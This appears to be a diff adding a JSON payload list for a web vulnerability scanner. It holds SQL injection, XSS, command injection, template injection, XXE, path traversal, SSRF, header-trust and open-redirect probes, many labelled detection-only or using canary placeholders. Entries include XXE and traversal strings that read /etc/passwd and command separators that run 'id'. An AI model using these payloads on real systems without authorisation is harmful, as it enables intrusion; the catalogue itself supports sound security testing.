@@ -1,0 +1,1102 @@
+{
+ "auth": [
+  {
+   "payload": "?admin=true",
+   "tests": "boolean admin parameter",
+   "kind": "auth"
+  },
+  {
+   "payload": "?role=admin",
+   "tests": "role parameter",
+   "kind": "auth"
+  },
+  {
+   "payload": "?user_id=1",
+   "tests": "identifier parameter (read-only IDOR shape)",
+   "kind": "auth"
+  },
+  {
+   "payload": "?id=1&id=2",
+   "tests": "duplicate-parameter pollution",
+   "kind": "auth"
+  },
+  {
+   "payload": "X-Original-URL: /admin",
+   "tests": "original-URL header override",
+   "kind": "auth"
+  },
+  {
+   "payload": "X-Rewrite-URL: /admin",
+   "tests": "rewrite-URL header override",
+   "kind": "auth"
+  },
+  {
+   "payload": "X-HTTP-Method-Override: GET",
+   "tests": "method-override header (safe value)",
+   "kind": "auth"
+  },
+  {
+   "payload": "?_method=GET",
+   "tests": "method parameter (safe value)",
+   "kind": "auth"
+  },
+  {
+   "payload": "Referer: https://trusted.example/",
+   "tests": "referer check bypass shape",
+   "kind": "auth"
+  },
+  {
+   "payload": "Origin: https://trusted.example/",
+   "tests": "origin check bypass shape",
+   "kind": "auth"
+  },
+  {
+   "payload": "?debug=true",
+   "tests": "debug-mode parameter",
+   "kind": "auth"
+  },
+  {
+   "payload": "?test=1",
+   "tests": "test-mode parameter",
+   "kind": "auth"
+  },
+  {
+   "payload": "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJwcm9iZSJ9.",
+   "tests": "JWT none-algorithm acceptance shape (unsigned sentinel, detection only)",
+   "kind": "auth"
+  },
+  {
+   "payload": "Authorization: Bearer eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uL2tleSJ9.cHJvYmU.c2ln",
+   "tests": "JWT kid-traversal shape (synthetic token, detection only)",
+   "kind": "auth"
+  },
+  {
+   "payload": "Cookie: sessionid=FIXATION_PROBE_000",
+   "tests": "session fixation shape (benign sentinel value)",
+   "kind": "auth"
+  },
+  {
+   "payload": "Cookie: session=probe; Secure",
+   "tests": "Secure cookie-attribute observation shape",
+   "kind": "auth"
+  },
+  {
+   "payload": "Cookie: session=probe; HttpOnly",
+   "tests": "HttpOnly cookie-attribute observation shape",
+   "kind": "auth"
+  },
+  {
+   "payload": "Cookie: session=probe; SameSite=None",
+   "tests": "SameSite cookie-attribute observation shape",
+   "kind": "auth"
+  },
+  {
+   "payload": "?response_type=token",
+   "tests": "OAuth implicit-flow parameter shape",
+   "kind": "auth"
+  },
+  {
+   "payload": "?redirect_uri=https://trusted.example/cb",
+   "tests": "OAuth redirect-uri parameter shape (benign value)",
+   "kind": "auth"
+  },
+  {
+   "payload": "?api_key=PROBE_KEY_000",
+   "tests": "API key in query parameter shape (sentinel value)",
+   "kind": "auth"
+  },
+  {
+   "payload": "X-API-Key: PROBE_KEY_000",
+   "tests": "API key in header shape (sentinel value)",
+   "kind": "auth"
+  },
+  {
+   "payload": "?role_id=1",
+   "tests": "numeric role-ID enumeration shape",
+   "kind": "auth"
+  },
+  {
+   "payload": "?reset_token=PROBE_TOKEN_000",
+   "tests": "password-reset token format shape (sentinel value)",
+   "kind": "auth"
+  }
+ ],
+ "headers": [
+  {
+   "payload": "X-Forwarded-For: 127.0.0.1",
+   "tests": "client-IP header trust",
+   "kind": "headers"
+  },
+  {
+   "payload": "X-Forwarded-Host: evil.example",
+   "tests": "forwarded-host trust",
+   "kind": "headers"
+  },
+  {
+   "payload": "X-Real-IP: 127.0.0.1",
+   "tests": "real-IP header trust",
+   "kind": "headers"
+  },
+  {
+   "payload": "Forwarded: for=127.0.0.1",
+   "tests": "RFC 7239 forwarded header",
+   "kind": "headers"
+  },
+  {
+   "payload": "X-Custom-IP-Authorization: 127.0.0.1",
+   "tests": "custom IP-auth header",
+   "kind": "headers"
+  },
+  {
+   "payload": "True-Client-IP: 127.0.0.1",
+   "tests": "CDN client-IP header",
+   "kind": "headers"
+  },
+  {
+   "payload": "Origin: https://evil.example",
+   "tests": "CORS origin reflection",
+   "kind": "headers"
+  },
+  {
+   "payload": "Origin: null",
+   "tests": "CORS null-origin handling",
+   "kind": "headers"
+  },
+  {
+   "payload": "Access-Control-Request-Method: PUT",
+   "tests": "CORS preflight method",
+   "kind": "headers"
+  },
+  {
+   "payload": "Access-Control-Request-Headers: x-custom",
+   "tests": "CORS preflight headers",
+   "kind": "headers"
+  },
+  {
+   "payload": "Upgrade-Insecure-Requests: 0",
+   "tests": "TLS downgrade signal",
+   "kind": "headers"
+  },
+  {
+   "payload": "Host: (empty)",
+   "tests": "empty Host header handling",
+   "kind": "headers"
+  },
+  {
+   "payload": "Origin: https://evil-target.com",
+   "tests": "CORS regex-bypass shape",
+   "kind": "headers"
+  },
+  {
+   "payload": "Origin: https://target.evil.example",
+   "tests": "CORS subdomain-trust bypass",
+   "kind": "headers"
+  },
+  {
+   "payload": "X-Original-URL: /admin",
+   "tests": "original-URL rewrite trust",
+   "kind": "headers"
+  },
+  {
+   "payload": "X-Rewrite-URL: /admin",
+   "tests": "IIS rewrite-URL trust",
+   "kind": "headers"
+  },
+  {
+   "payload": "X-Host: evil.example",
+   "tests": "alternate host header trust",
+   "kind": "headers"
+  },
+  {
+   "payload": "X-Forwarded-Proto: http",
+   "tests": "proto-downgrade trust",
+   "kind": "headers"
+  },
+  {
+   "payload": "X-HTTP-Method-Override: PUT",
+   "tests": "method-override header trust",
+   "kind": "headers"
+  },
+  {
+   "payload": "CF-Connecting-IP: 127.0.0.1",
+   "tests": "Cloudflare client-IP trust",
+   "kind": "headers"
+  },
+  {
+   "payload": "Transfer-Encoding: chunked",
+   "tests": "TE-only smuggling probe shape",
+   "kind": "headers"
+  },
+  {
+   "payload": "Content-Length: 0; Transfer-Encoding: chunked",
+   "tests": "CL.TE desync probe shape",
+   "kind": "headers"
+  }
+ ],
+ "sqli": [
+  {
+   "payload": "' OR '1'='1",
+   "tests": "classic tautology, single-quote context",
+   "kind": "sqli"
+  },
+  {
+   "payload": "' OR '1'='1' -- ",
+   "tests": "tautology with line comment",
+   "kind": "sqli"
+  },
+  {
+   "payload": "\" OR \"1\"=\"1",
+   "tests": "double-quote context",
+   "kind": "sqli"
+  },
+  {
+   "payload": "' OR 1=1 -- ",
+   "tests": "numeric-tolerant tautology",
+   "kind": "sqli"
+  },
+  {
+   "payload": "' UNION SELECT NULL-- ",
+   "tests": "union probe, 1 column",
+   "kind": "sqli"
+  },
+  {
+   "payload": "' UNION SELECT NULL,NULL-- ",
+   "tests": "union probe, 2 columns",
+   "kind": "sqli"
+  },
+  {
+   "payload": "' UNION SELECT NULL,NULL,NULL-- ",
+   "tests": "union probe, 3 columns",
+   "kind": "sqli"
+  },
+  {
+   "payload": "' AND SLEEP(5)-- ",
+   "tests": "time-based blind, MySQL",
+   "kind": "sqli"
+  },
+  {
+   "payload": "'; WAITFOR DELAY '0:0:5'-- ",
+   "tests": "time-based blind, MSSQL stacked",
+   "kind": "sqli"
+  },
+  {
+   "payload": "' || (SELECT pg_sleep(5))-- ",
+   "tests": "time-based blind, Postgres",
+   "kind": "sqli"
+  },
+  {
+   "payload": "1' AND '1'='1",
+   "tests": "inline true condition (differential baseline)",
+   "kind": "sqli"
+  },
+  {
+   "payload": "1' AND '1'='2",
+   "tests": "inline false condition (differential pair)",
+   "kind": "sqli"
+  },
+  {
+   "payload": "%27%20OR%20%271%27%3D%271",
+   "tests": "URL-encoded tautology",
+   "kind": "sqli"
+  },
+  {
+   "payload": "'/**/OR/**/'1'='1",
+   "tests": "inline-comment whitespace bypass",
+   "kind": "sqli"
+  },
+  {
+   "payload": "' OR 'a'='a'/*",
+   "tests": "block-comment truncation",
+   "kind": "sqli"
+  },
+  {
+   "payload": "admin'-- ",
+   "tests": "auth-bypass shape, comment",
+   "kind": "sqli"
+  },
+  {
+   "payload": "' OR SLEEP(5)#",
+   "tests": "hash-comment time-based, MySQL",
+   "kind": "sqli"
+  },
+  {
+   "payload": "1;SELECT SLEEP(5)",
+   "tests": "stacked query time-based",
+   "kind": "sqli"
+  },
+  {
+   "payload": "'\"",
+   "tests": "quote-breaker probe (error differential)",
+   "kind": "sqli"
+  },
+  {
+   "payload": "' AND 1=CONVERT(int,(SELECT @@version))-- ",
+   "tests": "error-based probe, MSSQL (detection only)",
+   "kind": "sqli"
+  },
+  {
+   "payload": "'||(SELECT SLEEP(2))||'",
+   "tests": "second-order stored time shape (fires on reuse)",
+   "kind": "sqli"
+  },
+  {
+   "payload": "{\"$gt\": \"\"}",
+   "tests": "NoSQL operator injection, MongoDB $gt",
+   "kind": "sqli"
+  },
+  {
+   "payload": "{\"username\": {\"$ne\": null}}",
+   "tests": "NoSQL auth bypass shape, MongoDB $ne",
+   "kind": "sqli"
+  },
+  {
+   "payload": "' UNION SELECT NULL FROM DUAL-- ",
+   "tests": "Oracle DUAL union probe (1 column)",
+   "kind": "sqli"
+  },
+  {
+   "payload": "'||CHAR(65,66,67)||'",
+   "tests": "string-concat operator probe (SQLite/MySQL)",
+   "kind": "sqli"
+  },
+  {
+   "payload": "%2527%2520OR%25201%253D1",
+   "tests": "double URL-encoded tautology (WAF bypass)",
+   "kind": "sqli"
+  },
+  {
+   "payload": "'%09OR%09'1'='1",
+   "tests": "tab-whitespace bypass",
+   "kind": "sqli"
+  },
+  {
+   "payload": "' AND CAST('a' AS INT)=1-- ",
+   "tests": "error-based CAST probe (detection only)",
+   "kind": "sqli"
+  }
+ ],
+ "xss": [
+  {
+   "payload": "<script>alert(1)</script>",
+   "tests": "classic script context",
+   "kind": "xss"
+  },
+  {
+   "payload": "<img src=x onerror=alert(1)>",
+   "tests": "event-handler vector",
+   "kind": "xss"
+  },
+  {
+   "payload": "<svg onload=alert(1)>",
+   "tests": "svg onload vector",
+   "kind": "xss"
+  },
+  {
+   "payload": "\"><script>alert(1)</script>",
+   "tests": "attribute breakout, double-quote",
+   "kind": "xss"
+  },
+  {
+   "payload": "'\"><img src=x onerror=alert(1)>",
+   "tests": "quote breakout, single+double",
+   "kind": "xss"
+  },
+  {
+   "payload": "<body onload=alert(1)>",
+   "tests": "body onload vector",
+   "kind": "xss"
+  },
+  {
+   "payload": "<details open ontoggle=alert(1)>",
+   "tests": "modern HTML vector",
+   "kind": "xss"
+  },
+  {
+   "payload": "<input onfocus=alert(1) autofocus>",
+   "tests": "input autofocus vector",
+   "kind": "xss"
+  },
+  {
+   "payload": "<marquee onstart=alert(1)>",
+   "tests": "marquee vector",
+   "kind": "xss"
+  },
+  {
+   "payload": "</textarea><script>alert(1)</script>",
+   "tests": "textarea breakout",
+   "kind": "xss"
+  },
+  {
+   "payload": "%3Cscript%3Ealert(1)%3C/script%3E",
+   "tests": "URL-encoded script",
+   "kind": "xss"
+  },
+  {
+   "payload": "<ScRiPt>alert(1)</ScRiPt>",
+   "tests": "case-variation bypass",
+   "kind": "xss"
+  },
+  {
+   "payload": "<scr<script>ipt>alert(1)</scr<script>ipt>",
+   "tests": "nested-tag filter bypass",
+   "kind": "xss"
+  },
+  {
+   "payload": "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
+   "tests": "HTML-entity encoded handler",
+   "kind": "xss"
+  },
+  {
+   "payload": "javascript:alert(1)",
+   "tests": "URL scheme context",
+   "kind": "xss"
+  },
+  {
+   "payload": "<a href=\"javascript:alert(1)\">x</a>",
+   "tests": "href javascript context",
+   "kind": "xss"
+  },
+  {
+   "payload": "<script>alert(1)</script >",
+   "tests": "trailing-space filter bypass",
+   "kind": "xss"
+  },
+  {
+   "payload": "<script>alert(String.fromCharCode(88,83,83))</script>",
+   "tests": "string-encoding evasion",
+   "kind": "xss"
+  },
+  {
+   "payload": "&lt;script&gt;alert(1)&lt;/script&gt;",
+   "tests": "double-encoding probe",
+   "kind": "xss"
+  },
+  {
+   "payload": "<img src=\"x\" onerror=\"alert(1)\">",
+   "tests": "quoted-attribute handler",
+   "kind": "xss"
+  },
+  {
+   "payload": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
+   "tests": "mutation XSS via noscript parsing",
+   "kind": "xss"
+  },
+  {
+   "payload": "<svg><foreignObject><body xmlns=\"http://www.w3.org/1999/xhtml\" onload=alert(1)>",
+   "tests": "SVG foreignObject namespace breakout",
+   "kind": "xss"
+  },
+  {
+   "payload": "${alert(1)}",
+   "tests": "template-literal injection probe",
+   "kind": "xss"
+  },
+  {
+   "payload": "<form id=\"x\"><input name=\"config\">",
+   "tests": "DOM clobbering via id/name collision",
+   "kind": "xss"
+  },
+  {
+   "payload": "</style><img src=x onerror=alert(1)>",
+   "tests": "style-context breakout",
+   "kind": "xss"
+  },
+  {
+   "payload": "<template><img src=x onerror=alert(1)></template>",
+   "tests": "template/shadow-DOM content probe",
+   "kind": "xss"
+  },
+  {
+   "payload": "<math><mi href=\"javascript:alert(1)\">x</mi></math>",
+   "tests": "MathML namespace href vector",
+   "kind": "xss"
+  }
+ ],
+ "cmdi": [
+  {
+   "payload": ";id",
+   "tests": "semicolon separator",
+   "kind": "cmdi"
+  },
+  {
+   "payload": "|id",
+   "tests": "pipe separator",
+   "kind": "cmdi"
+  },
+  {
+   "payload": "||id",
+   "tests": "or-separator",
+   "kind": "cmdi"
+  },
+  {
+   "payload": "&&id",
+   "tests": "and-separator",
+   "kind": "cmdi"
+  },
+  {
+   "payload": "$(id)",
+   "tests": "dollar-paren substitution",
+   "kind": "cmdi"
+  },
+  {
+   "payload": "`id`",
+   "tests": "backtick substitution",
+   "kind": "cmdi"
+  },
+  {
+   "payload": "; id",
+   "tests": "semicolon with space",
+   "kind": "cmdi"
+  },
+  {
+   "payload": "%3Bid",
+   "tests": "URL-encoded semicolon",
+   "kind": "cmdi"
+  },
+  {
+   "payload": ";echo VARIANT",
+   "tests": "semicolon echo-canary",
+   "kind": "cmdi"
+  },
+  {
+   "payload": "|echo VARIANT",
+   "tests": "pipe echo-canary",
+   "kind": "cmdi"
+  },
+  {
+   "payload": "a;id",
+   "tests": "trailing-context separator",
+   "kind": "cmdi"
+  },
+  {
+   "payload": "$(echo VARIANT)",
+   "tests": "substitution echo-canary",
+   "kind": "cmdi"
+  },
+  {
+   "payload": ";sleep 5",
+   "tests": "time-based detection, benign",
+   "kind": "cmdi"
+  },
+  {
+   "payload": "%0aid",
+   "tests": "newline separator, encoded",
+   "kind": "cmdi"
+  },
+  {
+   "payload": "& id &",
+   "tests": "background separator",
+   "kind": "cmdi"
+  },
+  {
+   "payload": "|sleep 2",
+   "tests": "time-based via pipe, short sleep",
+   "kind": "cmdi"
+  },
+  {
+   "payload": "||sleep 2",
+   "tests": "or-separator time-based, short sleep",
+   "kind": "cmdi"
+  },
+  {
+   "payload": "& echo VARIANT",
+   "tests": "Windows cmd separator with echo-canary",
+   "kind": "cmdi"
+  },
+  {
+   "payload": "%COMSPEC% /c echo VARIANT",
+   "tests": "Windows COMSPEC env var execution",
+   "kind": "cmdi"
+  },
+  {
+   "payload": ";echo${IFS}VARIANT",
+   "tests": "IFS whitespace filter bypass",
+   "kind": "cmdi"
+  },
+  {
+   "payload": ";nslookup {{CANARY}}",
+   "tests": "DNS canary out-of-band detection",
+   "kind": "cmdi"
+  },
+  {
+   "payload": "`echo VARIANT`",
+   "tests": "backtick echo-canary substitution",
+   "kind": "cmdi"
+  }
+ ],
+ "ssti": [
+  {
+   "payload": "{{7*7}}",
+   "tests": "Jinja2/Twig math detection",
+   "kind": "ssti"
+  },
+  {
+   "payload": "${7*7}",
+   "tests": "Freemarker/Velocity detection",
+   "kind": "ssti"
+  },
+  {
+   "payload": "#{7*7}",
+   "tests": "Pug/Slim detection",
+   "kind": "ssti"
+  },
+  {
+   "payload": "<%= 7*7 %>",
+   "tests": "EJS/ERB detection",
+   "kind": "ssti"
+  },
+  {
+   "payload": "{{7*'7'}}",
+   "tests": "string-concat probe",
+   "kind": "ssti"
+  },
+  {
+   "payload": "${{7*7}}",
+   "tests": "double-brace variant",
+   "kind": "ssti"
+  },
+  {
+   "payload": "{{config}}",
+   "tests": "Jinja2 config object probe (read-only)",
+   "kind": "ssti"
+  },
+  {
+   "payload": "{{self}}",
+   "tests": "template self-reference probe",
+   "kind": "ssti"
+  },
+  {
+   "payload": "*{7*7}",
+   "tests": "Spring expression detection",
+   "kind": "ssti"
+  },
+  {
+   "payload": "<%=7*7%>",
+   "tests": "ERB no-space variant",
+   "kind": "ssti"
+  },
+  {
+   "payload": "%7B%7B7*7%7D%7D",
+   "tests": "URL-encoded braces",
+   "kind": "ssti"
+  },
+  {
+   "payload": "[[${7*7}]]",
+   "tests": "Thymeleaf detection",
+   "kind": "ssti"
+  },
+  {
+   "payload": "{7*7}",
+   "tests": "Smarty single-brace detection",
+   "kind": "ssti"
+  },
+  {
+   "payload": "{{ 7*7 }}",
+   "tests": "whitespace-tolerant Jinja2/Twig/Blade variant",
+   "kind": "ssti"
+  },
+  {
+   "payload": "${7*'7'}",
+   "tests": "Freemarker string-concat probe",
+   "kind": "ssti"
+  },
+  {
+   "payload": "#set($x=7*7)$x",
+   "tests": "Velocity set-directive math detection",
+   "kind": "ssti"
+  },
+  {
+   "payload": "{{7*7}}${7*7}",
+   "tests": "polyglot Jinja2+Freemarker detection",
+   "kind": "ssti"
+  },
+  {
+   "payload": "<%= 7*7 %>${7*7}",
+   "tests": "polyglot ERB+Freemarker detection",
+   "kind": "ssti"
+  },
+  {
+   "payload": "{{7*7}}#{7*7}",
+   "tests": "polyglot Jinja2+Pug detection",
+   "kind": "ssti"
+  },
+  {
+   "payload": "{{7*7",
+   "tests": "unclosed-brace error-based context probe",
+   "kind": "ssti"
+  }
+ ],
+ "xxe": [
+  {
+   "payload": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><r>&xxe;</r>",
+   "tests": "classic external entity, read-only file probe",
+   "kind": "xxe"
+  },
+  {
+   "payload": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"http://{{CANARY}}/xxe\">]><r>&xxe;</r>",
+   "tests": "blind OOB to canary host",
+   "kind": "xxe"
+  },
+  {
+   "payload": "<!DOCTYPE r [<!ENTITY % xxe SYSTEM \"http://{{CANARY}}/xxe\"> %xxe;]>",
+   "tests": "parameter-entity OOB",
+   "kind": "xxe"
+  },
+  {
+   "payload": "<!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///nonexistent-{{CANARY}}\">]>",
+   "tests": "error-based entity probe",
+   "kind": "xxe"
+  },
+  {
+   "payload": "<r xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"file:///etc/passwd\"/></r>",
+   "tests": "XInclude file probe",
+   "kind": "xxe"
+  },
+  {
+   "payload": "<!DOCTYPE r [<!ENTITY xxe \"vulnerable\">]><r>&xxe;</r>",
+   "tests": "internal entity (no expansion attack)",
+   "kind": "xxe"
+  },
+  {
+   "payload": "<?xml version=\"1.0\" encoding=\"UTF-7\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
+   "tests": "encoding-declaration variant",
+   "kind": "xxe"
+  },
+  {
+   "payload": "<svg xmlns=\"http://www.w3.org/2000/svg\"><!DOCTYPE s [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]></svg>",
+   "tests": "SVG-embedded XXE shape",
+   "kind": "xxe"
+  },
+  {
+   "payload": "<!DOCTYPE r [<!ENTITY % pe SYSTEM \"file:///etc/hostname\"> %pe;]><r/>",
+   "tests": "external parameter entity via internal subset",
+   "kind": "xxe"
+  },
+  {
+   "payload": "<?xml version=\"1.0\"?><!DOCTYPE Envelope [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><soap:Envelope><soap:Body><r>&xxe;</r></soap:Body></soap:Envelope>",
+   "tests": "SOAP envelope XXE shape",
+   "kind": "xxe"
+  },
+  {
+   "payload": "<svg><!DOCTYPE s [<!ENTITY xxe \"svg-probe\">]><text>&xxe;</text></svg>",
+   "tests": "SVG internal-entity shape (no file read)",
+   "kind": "xxe"
+  },
+  {
+   "payload": "<?xml version=\"1.0\"?><!DOCTYPE Types [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><Types>&xxe;</Types>",
+   "tests": "OOXML content-types XXE shape",
+   "kind": "xxe"
+  },
+  {
+   "payload": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///xxe-probe-{{CANARY}}/\">]><r>&xxe;</r>",
+   "tests": "error-based via unreadable file URI",
+   "kind": "xxe"
+  },
+  {
+   "payload": "<?xml version=\"1.0\"?><!DOCTYPE r SYSTEM \"http://{{CANARY}}/evil.dtd\"><r>probe</r>",
+   "tests": "blind OOB via external DTD reference",
+   "kind": "xxe"
+  },
+  {
+   "payload": "<r xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"http://{{CANARY}}/xi\" parse=\"text\"/></r>",
+   "tests": "XInclude blind OOB to canary",
+   "kind": "xxe"
+  },
+  {
+   "payload": "<?xml version=\"1.0\"?><!DOCTYPE r PUBLIC \"-//TEST//EN\" \"file:///etc/hostname\"><r>probe</r>",
+   "tests": "external ID (PUBLIC) file probe",
+   "kind": "xxe"
+  }
+ ],
+ "traversal": [
+  {
+   "payload": "../../../etc/passwd",
+   "tests": "classic dot-dot-slash",
+   "kind": "traversal"
+  },
+  {
+   "payload": "..\\..\\..\\windows\\win.ini",
+   "tests": "windows backslash",
+   "kind": "traversal"
+  },
+  {
+   "payload": "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+   "tests": "encoded dots",
+   "kind": "traversal"
+  },
+  {
+   "payload": "%252e%252e/%252e%252e/etc/passwd",
+   "tests": "double-encoded dots",
+   "kind": "traversal"
+  },
+  {
+   "payload": "....//....//etc/passwd",
+   "tests": "double-slash bypass",
+   "kind": "traversal"
+  },
+  {
+   "payload": "..;/..;/etc/passwd",
+   "tests": "semicolon bypass",
+   "kind": "traversal"
+  },
+  {
+   "payload": "/etc/passwd",
+   "tests": "absolute path",
+   "kind": "traversal"
+  },
+  {
+   "payload": "....\\/....\\/etc/passwd",
+   "tests": "mixed slash escaping",
+   "kind": "traversal"
+  },
+  {
+   "payload": "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
+   "tests": "overlong UTF-8 dots",
+   "kind": "traversal"
+  },
+  {
+   "payload": "/var/www/html/../../../etc/passwd",
+   "tests": "prefixed traversal",
+   "kind": "traversal"
+  },
+  {
+   "payload": "....\\\\....\\\\windows\\\\win.ini",
+   "tests": "windows double-backslash bypass",
+   "kind": "traversal"
+  },
+  {
+   "payload": "%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
+   "tests": "encoded backslashes",
+   "kind": "traversal"
+  },
+  {
+   "payload": "..%2f..%2fetc%2fpasswd",
+   "tests": "encoded slashes only",
+   "kind": "traversal"
+  },
+  {
+   "payload": ".%2e/.%2e/.%2e/etc/passwd",
+   "tests": "dot-mixed encoding",
+   "kind": "traversal"
+  },
+  {
+   "payload": "..%c0%af..%c0%afetc/passwd",
+   "tests": "mixed overlong separator",
+   "kind": "traversal"
+  },
+  {
+   "payload": "../../../etc/passwd%00",
+   "tests": "null byte injection (legacy)",
+   "kind": "traversal"
+  },
+  {
+   "payload": "%u002e%u002e/%u002e%u002e/etc/passwd",
+   "tests": "unicode-encoded dots",
+   "kind": "traversal"
+  },
+  {
+   "payload": "C:\\windows\\win.ini",
+   "tests": "windows absolute drive path",
+   "kind": "traversal"
+  },
+  {
+   "payload": "\\\\server\\share\\..\\..\\windows\\win.ini",
+   "tests": "UNC path traversal",
+   "kind": "traversal"
+  },
+  {
+   "payload": "../../../../tmp/traversal-test",
+   "tests": "zip slip detection (benign target)",
+   "kind": "traversal"
+  },
+  {
+   "payload": "../../../var/log/app.log",
+   "tests": "log file access detection (benign)",
+   "kind": "traversal"
+  }
+ ],
+ "ssrf": [
+  {
+   "payload": "http://{{CANARY}}/",
+   "tests": "baseline canary fetch (control)",
+   "kind": "ssrf"
+  },
+  {
+   "payload": "http://loopback.{{CANARY}}/",
+   "tests": "loopback name guard-verdict",
+   "kind": "ssrf"
+  },
+  {
+   "payload": "http://localhost.{{CANARY}}/",
+   "tests": "localhost name guard-verdict",
+   "kind": "ssrf"
+  },
+  {
+   "payload": "http://0.0.0.0.{{CANARY}}/",
+   "tests": "any-address guard-verdict shape",
+   "kind": "ssrf"
+  },
+  {
+   "payload": "http://2130706433/",
+   "tests": "decimal-encoded loopback",
+   "kind": "ssrf"
+  },
+  {
+   "payload": "http://0177.0.0.1/",
+   "tests": "octal-encoded loopback",
+   "kind": "ssrf"
+  },
+  {
+   "payload": "http://0x7f.0.0.1/",
+   "tests": "hex-encoded loopback",
+   "kind": "ssrf"
+  },
+  {
+   "payload": "http://[::ffff:127.0.0.1]/",
+   "tests": "IPv6-mapped loopback",
+   "kind": "ssrf"
+  },
+  {
+   "payload": "http://{{CANARY}}@127.0.0.1/",
+   "tests": "userinfo @ trick shape",
+   "kind": "ssrf"
+  },
+  {
+   "payload": "gopher://{{CANARY}}/",
+   "tests": "gopher scheme - allowlist test",
+   "kind": "ssrf"
+  },
+  {
+   "payload": "dict://{{CANARY}}/",
+   "tests": "dict scheme - allowlist test",
+   "kind": "ssrf"
+  },
+  {
+   "payload": "file:///etc/passwd",
+   "tests": "file scheme - allowlist test",
+   "kind": "ssrf"
+  },
+  {
+   "payload": "http://shortloop.{{CANARY}}/",
+   "tests": "short-form loopback guard-verdict",
+   "kind": "ssrf"
+  },
+  {
+   "payload": "http://zero.{{CANARY}}/",
+   "tests": "zero-address guard-verdict shape",
+   "kind": "ssrf"
+  },
+  {
+   "payload": "https://{{CANARY}}%2e127.0.0.1/",
+   "tests": "encoded-dot confusion shape",
+   "kind": "ssrf"
+  },
+  {
+   "payload": "http://169.254.169.254.{{CANARY}}/",
+   "tests": "cloud metadata guard-verdict (canary-suffixed)",
+   "kind": "ssrf"
+  },
+  {
+   "payload": "http://[::1].{{CANARY}}/",
+   "tests": "IPv6 loopback guard-verdict",
+   "kind": "ssrf"
+  },
+  {
+   "payload": "http://0x7f.0x0.0x0.0x1/",
+   "tests": "hex-encoded loopback IP",
+   "kind": "ssrf"
+  },
+  {
+   "payload": "http://canary.127.0.0.1.nip.io/",
+   "tests": "DNS rebinding detection shape",
+   "kind": "ssrf"
+  },
+  {
+   "payload": "http://target.com\\t@{{CANARY}}/",
+   "tests": "tab-in-userinfo parser confusion",
+   "kind": "ssrf"
+  }
+ ],
+ "redirect": [
+  {
+   "payload": "//evil.example/",
+   "tests": "scheme-relative redirect",
+   "kind": "redirect"
+  },
+  {
+   "payload": "https://evil.example/",
+   "tests": "absolute external URL",
+   "kind": "redirect"
+  },
+  {
+   "payload": "/\\/evil.example/",
+   "tests": "backslash confusion",
+   "kind": "redirect"
+  },
+  {
+   "payload": "%2f%2fevil.example%2f",
+   "tests": "fully encoded slashes",
+   "kind": "redirect"
+  },
+  {
+   "payload": "//evil%2eexample/",
+   "tests": "encoded dot in host",
+   "kind": "redirect"
+  },
+  {
+   "payload": "https://trusted.example@evil.example/",
+   "tests": "userinfo @ trick",
+   "kind": "redirect"
+  },
+  {
+   "payload": "https://evil.example%2f..",
+   "tests": "encoded path confusion",
+   "kind": "redirect"
+  },
+  {
+   "payload": "javascript:alert(1)",
+   "tests": "javascript scheme landing",
+   "kind": "redirect"
+  },
+  {
+   "payload": "data:text/html,<script>alert(1)</script>",
+   "tests": "data scheme landing",
+   "kind": "redirect"
+  },
+  {
+   "payload": "/%09/evil.example/",
+   "tests": "tab-in-path confusion",
+   "kind": "redirect"
+  },
+  {
+   "payload": "https://trusted.evil.example/",
+   "tests": "subdomain whitelist bypass",
+   "kind": "redirect"
+  },
+  {
+   "payload": "/login?next=https://evil.example/",
+   "tests": "nested redirect parameter",
+   "kind": "redirect"
+  },
+  {
+   "payload": "java%09script:alert(1)",
+   "tests": "encoded tab in scheme",
+   "kind": "redirect"
+  },
+  {
+   "payload": "https:evil.example/",
+   "tests": "scheme missing slashes",
+   "kind": "redirect"
+  },
+  {
+   "payload": "//evil.example/%2e%2e/",
+   "tests": "encoded traversal in redirect path",
+   "kind": "redirect"
+  },
+  {
+   "payload": "https://evil.example%23@trusted.example/",
+   "tests": "encoded fragment @ confusion",
+   "kind": "redirect"
+  }
+ ]
+}
